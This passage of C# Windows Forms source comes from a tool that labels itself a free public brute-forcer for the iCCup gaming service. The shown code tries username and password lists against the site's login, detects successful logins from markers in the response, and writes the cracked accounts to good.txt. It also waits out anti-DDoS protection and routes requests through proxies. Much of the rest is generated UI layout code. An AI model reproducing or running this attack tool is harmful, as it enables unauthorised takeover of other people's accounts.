                                File.AppendAllText("test.log", "LOOOOGIIIN:" + username + " = " + password);
                                File.AppendAllText("test.log", "\n\n\n\n\n\n\n");

                                File.AppendAllText("test2.log", responseUri.AbsolutePath);
                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");
                                File.AppendAllText("test2.log", "LOOOOGIIIN:" + username + " = " + password);
                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");*/
                                { ++CurCount; }
                                if (end.IndexOf("S_checkmark.jpg") <= 0 && end.IndexOf("transfer-attention") <= 0 && responseUri.AbsolutePath.IndexOf("category/6") <= 0)
                                {
                                    if (responseUri.AbsolutePath.IndexOf("success") <= 0 && end.IndexOf("Нельзя сделать трансфер") <= 0)
                                        goto label_58;
                                }
                                bool flag1 = end.IndexOf("transfer-attention") > 0;
                                string empty = string.Empty;
                                if (end.IndexOf("S_checkmark.jpg") > 0)
                                    empty += "1";
                                if (end.IndexOf("transfer-attention") > 0)
                                    empty += "2";
                                if (responseUri.AbsolutePath.IndexOf("category/6") > 0)
                                    empty += "3";
                                if (responseUri.AbsolutePath.IndexOf("success") > 0)
                                    empty += "4";
                                string path = "good.txt";
                                bool flag2 = false;
                                if (!System.IO.File.Exists(path))
                                    System.IO.File.Create(path).Close();
                                List<string> stringList = new List<string>((IEnumerable<string>)System.IO.File.ReadAllLines(path));
                                foreach (string str3 in goodlist)
                                {
                                    if (username.ToLower() == str3.ToLower())
                                        flag2 = true;
                                }
                                if (str1 == password || str2 == username)
                                    flag2 = true;
                                str1 = password;
                                str2 = username;
                                if (!flag2)
                                {
                                    int index2 = 0;
                                    while (index2 < AbsolBruter.GlobalVars.BruteBase.Count)
                                    {
                                        if (AbsolBruter.GlobalVars.BruteBase[index2].username == username)
                                            AbsolBruter.GlobalVars.BruteBase[index2] = new AbsolBruter.GlobalVars.BruteBaseStruct(username, password, true);
                                         { ++index2; }
                                    }
                                }
                                if (flag2)
                                {
                                    AddLogBoxItem("Возможный ник :" + username + ", Пароль:" + password + ".");
                                    AddLogBoxItem("Возможно нужен рестарт, 8 сек...");
                                    Thread.Sleep(7000);
                                    checkbuttonneedenable = false;
                                    str1 = "";
                                    str2 = "";
                                    SetLoginAndStartLatency();
                                }
                                else
                                    goodlist.Add(username);
                                stringList.Add(username + ";" + password + (flag1 ? " ->не доступен?!" : ""));
                                System.IO.File.WriteAllLines(path, stringList.ToArray());
                                AddLogBoxItem("\r Найден акк! Ник:" + username + ", Пароль:" + password + ". Метод обнаружения:" + empty);
                            }
                            else
                            {
                                AddLogBoxItem("Сработала защита от ддоса#2");
                                AddLogBoxItem("ждем 20 сек");
                                Thread.Sleep(20000);
                                checkbuttonneedenable = false;
                                SetLoginAndStartLatency();
                                continue;
                            }
                        }
                        catch (Exception ex)
                        {
                            AddLogBoxItem("Непонятная ошибка, жду 10 сек.");
                            AddLogBoxItem(ex.Message);
                            Thread.Sleep(10000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                    label_58:
                        AbsolBruter.GlobalVars.BruteBase[index1] = new AbsolBruter.GlobalVars.BruteBaseStruct(username, password, true);
                        break;
                    }
                }
                 { ++index1; }
            }
            working = false;
        }

        public void StartButton_Click(object sender, EventArgs e)
        {
            if (loggedin && IsAllOkay())
            {
                if (!working)
                {
                    new Thread(new ThreadStart(SingleThreadBruter)).Start();
                    AddLogBoxItem("Брут запущен!");
                    AddLogBoxItem("В один поток.");
                    CurTryCount = 0;
                    CurCount = 0;
                }
                else
                    AddLogBoxItem("Брут уже запущен!!");
            }
            else
                AddLogBoxItem("Введите рабочий логин!!!");
        }

        public void PauseButton_Click(object sender, EventArgs e)
        {
            pause = !pause;
            if (pause)
                AddLogBoxItem("Включена пауза!");
            else
                AddLogBoxItem("Пауза отключена!");
        }

        public void AddProxyBtn_Click(object sender, EventArgs e)
        {
        }

        public void BruteUsername_TextChanged(object sender, EventArgs e)
        {
            System.IO.File.WriteAllText("lastlogin.txt", BruteUsername.Text);
        }

        public void BrutePassword_TextChanged(object sender, EventArgs e)
        {
            System.IO.File.WriteAllText("lastpwd.txt", BrutePassword.Text);
        }

        public void MyProxy_TextChanged(object sender, EventArgs e)
        {
            if (MyProxy.Text == "127.0.0.1")
            {
                proxy = new WebProxy();
            }
            else
            {
                try
                {
                    proxy = new WebProxy(new Uri("https:\\\\" + MyProxy.Text), true);
                }
                catch (Exception ex)
                {
                    AddLogBoxItem("Error:" + ex.Message);
                    proxy = new WebProxy();
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
                components.Dispose();
            base.Dispose(disposing);
        }

        public void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.PokePictBox = new System.Windows.Forms.PictureBox();
            this.PokeGoTimer = new System.Windows.Forms.Timer(this.components);
            this.ExitButton = new System.Windows.Forms.PictureBox();
            this.TrayButton = new System.Windows.Forms.PictureBox();
            this.BruteUsername = new System.Windows.Forms.TextBox();
            this.BrutePassword = new System.Windows.Forms.TextBox();
            this.CheckButton = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.SwapMode = new System.Windows.Forms.PictureBox();
            this.UsernamesForBrute = new System.Windows.Forms.Button();
            this.PasswordForBrute = new System.Windows.Forms.Button();
            this.SwapLoginTypeTimer = new System.Windows.Forms.Timer(this.components);
            this.SeparatorLP = new System.Windows.Forms.TextBox();
            this.LabelM1 = new System.Windows.Forms.Label();
            this.LoadNickPwdSeperated = new System.Windows.Forms.Button();
            this.LabelM3 = new System.Windows.Forms.Label();
            this.LabelM2 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.UsersCount = new System.Windows.Forms.Label();
            this.BaseLoaded = new System.Windows.Forms.PictureBox();
            this.LoginIccupGetted = new System.Windows.Forms.PictureBox();
            this.RunnedBrute = new System.Windows.Forms.PictureBox();
            this.label7 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.PcEnd = new System.Windows.Forms.Label();
            this.PauseButton = new System.Windows.Forms.Button();
            this.StartButton = new System.Windows.Forms.Button();
            this.BruTray = new System.Windows.Forms.NotifyIcon(this.components);
            this.MyProxy = new System.Windows.Forms.TextBox();
            this.LogMyBox = new UnrealIccupBruteforcer.FuckListBox();
            this.label5 = new System.Windows.Forms.Label();
            this.CurrentLogin = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.CurrentPassword = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.PokePictBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.ExitButton)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.TrayButton)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.CheckButton)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.SwapMode)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.BaseLoaded)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.LoginIccupGetted)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.RunnedBrute)).BeginInit();
            this.SuspendLayout();
            // 
            // PokePictBox
            // 
            this.PokePictBox.BackColor = System.Drawing.Color.Transparent;
            this.PokePictBox.Image = global::UnrealIccupBruteforcer.AllResources.PokeLine;
            this.PokePictBox.Location = new System.Drawing.Point(0, 560);
            this.PokePictBox.Name = "PokePictBox";
            this.PokePictBox.Size = new System.Drawing.Size(400, 40);
            this.PokePictBox.TabIndex = 0;
            this.PokePictBox.TabStop = false;
            // 
            // PokeGoTimer
            // 
            this.PokeGoTimer.Enabled = true;
            this.PokeGoTimer.Interval = 50;
            this.PokeGoTimer.Tick += new System.EventHandler(this.PokeGoTimer_Tick);
            // 
            // ExitButton
            // 
            this.ExitButton.BackColor = System.Drawing.Color.Transparent;
            this.ExitButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.ExitButton;
            this.ExitButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ExitButton.Location = new System.Drawing.Point(339, 12);
            this.ExitButton.Name = "ExitButton";
            this.ExitButton.Size = new System.Drawing.Size(61, 55);
            this.ExitButton.TabIndex = 1;
            this.ExitButton.TabStop = false;
            this.ExitButton.Click += new System.EventHandler(this.ExitButton_Click);
            this.ExitButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.ExitButton_MouseDown);
            this.ExitButton.MouseEnter += new System.EventHandler(this.ExitButton_MouseEnter);
            this.ExitButton.MouseLeave += new System.EventHandler(this.ExitButton_MouseLeave);
            this.ExitButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.ExitButton_MouseUp);
            // 
            // TrayButton
            // 
            this.TrayButton.BackColor = System.Drawing.Color.Transparent;
            this.TrayButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.TrayBtn;
            this.TrayButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.TrayButton.Location = new System.Drawing.Point(269, 7);
            this.TrayButton.Name = "TrayButton";
            this.TrayButton.Size = new System.Drawing.Size(66, 59);
            this.TrayButton.TabIndex = 1;
            this.TrayButton.TabStop = false;
            this.TrayButton.Click += new System.EventHandler(this.TrayButton_Click);
            this.TrayButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.TrayButton_MouseDown);
            this.TrayButton.MouseEnter += new System.EventHandler(this.TrayButton_MouseEnter);
            this.TrayButton.MouseLeave += new System.EventHandler(this.TrayButton_MouseLeave);
            this.TrayButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.TrayButton_MouseUp);
            // 
            // BruteUsername
            // 
            this.BruteUsername.BackColor = System.Drawing.Color.DimGray;
            this.BruteUsername.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.BruteUsername.ForeColor = System.Drawing.SystemColors.Menu;
            this.BruteUsername.Location = new System.Drawing.Point(126, 116);
            this.BruteUsername.Name = "BruteUsername";
            this.BruteUsername.Size = new System.Drawing.Size(199, 27);
            this.BruteUsername.TabIndex = 1;
            this.BruteUsername.TextChanged += new System.EventHandler(this.BruteUsername_TextChanged);
            // 
            // BrutePassword
            // 
            this.BrutePassword.BackColor = System.Drawing.Color.DimGray;
            this.BrutePassword.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.BrutePassword.ForeColor = System.Drawing.SystemColors.Menu;
            this.BrutePassword.Location = new System.Drawing.Point(126, 158);
            this.BrutePassword.Name = "BrutePassword";
            this.BrutePassword.Size = new System.Drawing.Size(199, 27);
            this.BrutePassword.TabIndex = 2;
            this.BrutePassword.TextChanged += new System.EventHandler(this.BrutePassword_TextChanged);
            // 
            // CheckButton
            // 
            this.CheckButton.BackColor = System.Drawing.Color.Transparent;
            this.CheckButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.CheckBtn;
            this.CheckButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.CheckButton.Location = new System.Drawing.Point(158, 190);
            this.CheckButton.Name = "CheckButton";
            this.CheckButton.Size = new System.Drawing.Size(145, 40);
            this.CheckButton.TabIndex = 3;
            this.CheckButton.TabStop = false;
            this.CheckButton.Click += new System.EventHandler(this.CheckButton_Click);
            this.CheckButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.CheckButton_MouseDown);
            this.CheckButton.MouseEnter += new System.EventHandler(this.CheckButton_MouseEnter);
            this.CheckButton.MouseLeave += new System.EventHandler(this.CheckButton_MouseLeave);
            this.CheckButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.CheckButton_MouseUp);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label1.Location = new System.Drawing.Point(30, 138);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(69, 24);
            this.label1.TabIndex = 4;
            this.label1.Text = "Логин:";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Location = new System.Drawing.Point(113, 90);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(228, 13);
            this.label2.TabIndex = 5;
            this.label2.Text = "Сюда нужно вставить любой логин iCCUp\'а.";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label3.Location = new System.Drawing.Point(24, 239);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(358, 13);
            this.label3.TabIndex = 6;
            this.label3.Text = "Теперь нужно выбрать метод загрузки логинов и паролей";
            // 
            // SwapMode
            // 
            this.SwapMode.BackColor = System.Drawing.Color.Transparent;
            this.SwapMode.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.MegoCheckBoxFirstpart;
            this.SwapMode.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.SwapMode.Location = new System.Drawing.Point(126, 263);
            this.SwapMode.Name = "SwapMode";
            this.SwapMode.Size = new System.Drawing.Size(197, 78);
            this.SwapMode.TabIndex = 7;
            this.SwapMode.TabStop = false;
            this.SwapMode.Click += new System.EventHandler(this.SwapMode_Click);
            this.SwapMode.DragEnter += new System.Windows.Forms.DragEventHandler(this.SwapMode_DragEnter);
            this.SwapMode.MouseDown += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseDown);
            this.SwapMode.MouseEnter += new System.EventHandler(this.SwapMode_MouseEnter);
            this.SwapMode.MouseLeave += new System.EventHandler(this.SwapMode_MouseLeave);
            this.SwapMode.MouseMove += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseMove);
            this.SwapMode.MouseUp += new System.Windows.Forms.MouseEventHandler(this.SwapMode_MouseUp);
            // 
            // UsernamesForBrute
            // 
            this.UsernamesForBrute.BackColor = System.Drawing.Color.DimGray;
            this.UsernamesForBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
            this.UsernamesForBrute.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.UsernamesForBrute.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.UsernamesForBrute.Location = new System.Drawing.Point(11, 265);
            this.UsernamesForBrute.Name = "UsernamesForBrute";
            this.UsernamesForBrute.Size = new System.Drawing.Size(109, 27);
            this.UsernamesForBrute.TabIndex = 3;
            this.UsernamesForBrute.Text = "Ники";
            this.UsernamesForBrute.UseVisualStyleBackColor = false;
            this.UsernamesForBrute.Click += new System.EventHandler(this.UsernamesForBrute_Click);
            // 
            // PasswordForBrute
            // 
            this.PasswordForBrute.BackColor = System.Drawing.Color.DimGray;
            this.PasswordForBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
            this.PasswordForBrute.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.PasswordForBrute.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.PasswordForBrute.Location = new System.Drawing.Point(12, 314);
            this.PasswordForBrute.Name = "PasswordForBrute";
            this.PasswordForBrute.Size = new System.Drawing.Size(109, 27);
            this.PasswordForBrute.TabIndex = 4;
            this.PasswordForBrute.Text = "Пароли";
            this.PasswordForBrute.UseVisualStyleBackColor = false;
            this.PasswordForBrute.Click += new System.EventHandler(this.PasswordForBrute_Click);
            // 
            // SwapLoginTypeTimer
            // 
            this.SwapLoginTypeTimer.Enabled = true;
            this.SwapLoginTypeTimer.Interval = 200;
            this.SwapLoginTypeTimer.Tick += new System.EventHandler(this.SwapLoginTypeTimer_Tick);
            // 
            // SeparatorLP
            // 
            this.SeparatorLP.BackColor = System.Drawing.Color.DimGray;
            this.SeparatorLP.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.SeparatorLP.ForeColor = System.Drawing.SystemColors.Menu;
            this.SeparatorLP.Location = new System.Drawing.Point(38, 280);
            this.SeparatorLP.Name = "SeparatorLP";
            this.SeparatorLP.Size = new System.Drawing.Size(46, 27);
            this.SeparatorLP.TabIndex = 5;
            this.SeparatorLP.Text = ";";
            this.SeparatorLP.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.SeparatorLP.Visible = false;
            // 
            // LabelM1
            // 
            this.LabelM1.AutoSize = true;
            this.LabelM1.BackColor = System.Drawing.Color.Transparent;
            this.LabelM1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LabelM1.Location = new System.Drawing.Point(8, 260);
            this.LabelM1.Name = "LabelM1";
            this.LabelM1.Size = new System.Drawing.Size(105, 17);
            this.LabelM1.TabIndex = 9;
            this.LabelM1.Text = "Разделитель";
            this.LabelM1.Visible = false;
            // 
            // LoadNickPwdSeperated
            // 
            this.LoadNickPwdSeperated.BackColor = System.Drawing.Color.DimGray;
            this.LoadNickPwdSeperated.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
            this.LoadNickPwdSeperated.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LoadNickPwdSeperated.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.LoadNickPwdSeperated.Location = new System.Drawing.Point(11, 314);
            this.LoadNickPwdSeperated.Name = "LoadNickPwdSeperated";
            this.LoadNickPwdSeperated.Size = new System.Drawing.Size(109, 27);
            this.LoadNickPwdSeperated.TabIndex = 6;
            this.LoadNickPwdSeperated.Text = "Открыть файл";
            this.LoadNickPwdSeperated.UseVisualStyleBackColor = false;
            this.LoadNickPwdSeperated.Visible = false;
            this.LoadNickPwdSeperated.Click += new System.EventHandler(this.LoadNickPwdSeperated_Click);
            // 
            // LabelM3
            // 
            this.LabelM3.AutoSize = true;
            this.LabelM3.BackColor = System.Drawing.Color.Transparent;
            this.LabelM3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LabelM3.Location = new System.Drawing.Point(90, 286);
            this.LabelM3.Name = "LabelM3";
            this.LabelM3.Size = new System.Drawing.Size(26, 17);
            this.LabelM3.TabIndex = 9;
            this.LabelM3.Text = "——";
            this.LabelM3.Visible = false;
            // 
            // LabelM2
            // 
            this.LabelM2.AutoSize = true;
            this.LabelM2.BackColor = System.Drawing.Color.Transparent;
            this.LabelM2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LabelM2.Location = new System.Drawing.Point(6, 286);
            this.LabelM2.Name = "LabelM2";
            this.LabelM2.Size = new System.Drawing.Size(26, 17);
            this.LabelM2.TabIndex = 9;
            this.LabelM2.Text = "——";
            this.LabelM2.Visible = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label4.Location = new System.Drawing.Point(15, 58);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(44, 17);
            this.label4.TabIndex = 11;
            this.label4.Text = "БАЗА";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.Transparent;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label6.Location = new System.Drawing.Point(24, 344);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(60, 17);
            this.label6.TabIndex = 11;
            this.label6.Text = "Прокси:";
            // 
            // UsersCount
            // 
            this.UsersCount.AutoSize = true;
            this.UsersCount.BackColor = System.Drawing.Color.Transparent;
            this.UsersCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.UsersCount.Location = new System.Drawing.Point(231, 344);
            this.UsersCount.Name = "UsersCount";
            this.UsersCount.Size = new System.Drawing.Size(16, 17);
            this.UsersCount.TabIndex = 11;
            this.UsersCount.Text = "0";
            // 
            // BaseLoaded
            // 
            this.BaseLoaded.BackColor = System.Drawing.Color.Transparent;
            this.BaseLoaded.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
            this.BaseLoaded.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.BaseLoaded.Location = new System.Drawing.Point(12, 12);
            this.BaseLoaded.Name = "BaseLoaded";
            this.BaseLoaded.Size = new System.Drawing.Size(52, 48);
            this.BaseLoaded.TabIndex = 13;
            this.BaseLoaded.TabStop = false;
            // 
            // LoginIccupGetted
            // 
            this.LoginIccupGetted.BackColor = System.Drawing.Color.Transparent;
            this.LoginIccupGetted.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
            this.LoginIccupGetted.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.LoginIccupGetted.Location = new System.Drawing.Point(93, 12);
            this.LoginIccupGetted.Name = "LoginIccupGetted";
            this.LoginIccupGetted.Size = new System.Drawing.Size(52, 48);
            this.LoginIccupGetted.TabIndex = 13;
            this.LoginIccupGetted.TabStop = false;
            // 
            // RunnedBrute
            // 
            this.RunnedBrute.BackColor = System.Drawing.Color.Transparent;
            this.RunnedBrute.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.Bad;
            this.RunnedBrute.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.RunnedBrute.Location = new System.Drawing.Point(171, 12);
            this.RunnedBrute.Name = "RunnedBrute";
            this.RunnedBrute.Size = new System.Drawing.Size(52, 48);
            this.RunnedBrute.TabIndex = 13;
            this.RunnedBrute.TabStop = false;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.Transparent;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label7.Location = new System.Drawing.Point(91, 58);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(57, 17);
            this.label7.TabIndex = 11;
            this.label7.Text = "ЛОГИН";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.Transparent;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label8.Location = new System.Drawing.Point(172, 59);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(53, 17);
            this.label8.TabIndex = 11;
            this.label8.Text = "СТАРТ";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.BackColor = System.Drawing.Color.Transparent;
            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label9.Location = new System.Drawing.Point(159, 344);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(66, 17);
            this.label9.TabIndex = 11;
            this.label9.Text = "Логинов:";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.Transparent;
            this.label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label10.Location = new System.Drawing.Point(133, 535);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(87, 17);
            this.label10.TabIndex = 11;
            this.label10.Text = "Завершено:";
            // 
            // PcEnd
            // 
            this.PcEnd.AutoSize = true;
            this.PcEnd.BackColor = System.Drawing.Color.Transparent;
            this.PcEnd.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.PcEnd.Location = new System.Drawing.Point(217, 535);
            this.PcEnd.Name = "PcEnd";
            this.PcEnd.Size = new System.Drawing.Size(30, 17);
            this.PcEnd.TabIndex = 11;
            this.PcEnd.Text = "0%";
            // 
            // PauseButton
            // 
            this.PauseButton.BackColor = System.Drawing.Color.DimGray;
            this.PauseButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
            this.PauseButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.PauseButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.PauseButton.Location = new System.Drawing.Point(18, 530);
            this.PauseButton.Name = "PauseButton";
            this.PauseButton.Size = new System.Drawing.Size(109, 27);
            this.PauseButton.TabIndex = 8;
            this.PauseButton.Text = "Пауза";
            this.PauseButton.UseVisualStyleBackColor = false;
            this.PauseButton.Click += new System.EventHandler(this.PauseButton_Click);
            // 
            // StartButton
            // 
            this.StartButton.BackColor = System.Drawing.Color.DimGray;
            this.StartButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.EditBox_;
            this.StartButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.StartButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.StartButton.Location = new System.Drawing.Point(268, 530);
            this.StartButton.Name = "StartButton";
            this.StartButton.Size = new System.Drawing.Size(109, 27);
            this.StartButton.TabIndex = 9;
            this.StartButton.Text = "Старт";
            this.StartButton.UseVisualStyleBackColor = false;
            this.StartButton.Click += new System.EventHandler(this.StartButton_Click);
            // 
            // BruTray
            // 
            this.BruTray.BalloonTipText = "Free bruteforcer for iCCup!";
            this.BruTray.BalloonTipTitle = "iCCup Bruteforce";
            this.BruTray.Icon = global::UnrealIccupBruteforcer.AllResources.BruTray;
            this.BruTray.Text = "iCCup public Bruteforcer";
            this.BruTray.Visible = true;
            this.BruTray.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.BruTray_MouseDoubleClick);
            // 
            // MyProxy
            // 
            this.MyProxy.BackColor = System.Drawing.Color.DimGray;
            this.MyProxy.Font = new System.Drawing.Font("Times New Roman", 13F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.MyProxy.ForeColor = System.Drawing.SystemColors.Menu;
            this.MyProxy.Location = new System.Drawing.Point(12, 364);
            this.MyProxy.Name = "MyProxy";
            this.MyProxy.Size = new System.Drawing.Size(127, 27);
            this.MyProxy.TabIndex = 5;
            this.MyProxy.Text = "127.0.0.1";
            this.MyProxy.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.MyProxy.TextChanged += new System.EventHandler(this.MyProxy_TextChanged);
            // 
            // LogMyBox
            // 
            this.LogMyBox.BackColor = System.Drawing.Color.Transparent;
            this.LogMyBox.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawVariable;
            this.LogMyBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.LogMyBox.ForeColor = System.Drawing.SystemColors.Menu;
            this.LogMyBox.FormattingEnabled = true;
            this.LogMyBox.ItemHeight = 15;
            this.LogMyBox.Items.AddRange(new object[] {
            " ",
            "  iCCup BruteForce by Absol(d3scene.ru) ",
            "   Free for public lvl2.",
            " ",
            " "});
            this.LogMyBox.Location = new System.Drawing.Point(12, 405);
            this.LogMyBox.Name = "LogMyBox";
            this.LogMyBox.Size = new System.Drawing.Size(370, 119);
            this.LogMyBox.TabIndex = 10;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label5.Location = new System.Drawing.Point(154, 361);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(111, 17);
            this.label5.TabIndex = 11;
            this.label5.Text = "Текущий логин:";
            // 
            // CurrentLogin
            // 
            this.CurrentLogin.AutoSize = true;
            this.CurrentLogin.BackColor = System.Drawing.Color.Transparent;
            this.CurrentLogin.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.CurrentLogin.Location = new System.Drawing.Point(271, 361);
            this.CurrentLogin.Name = "CurrentLogin";
            this.CurrentLogin.Size = new System.Drawing.Size(0, 17);
            this.CurrentLogin.TabIndex = 11;
            // 
            // label12
            // 
            this.label12.AutoSize = true;
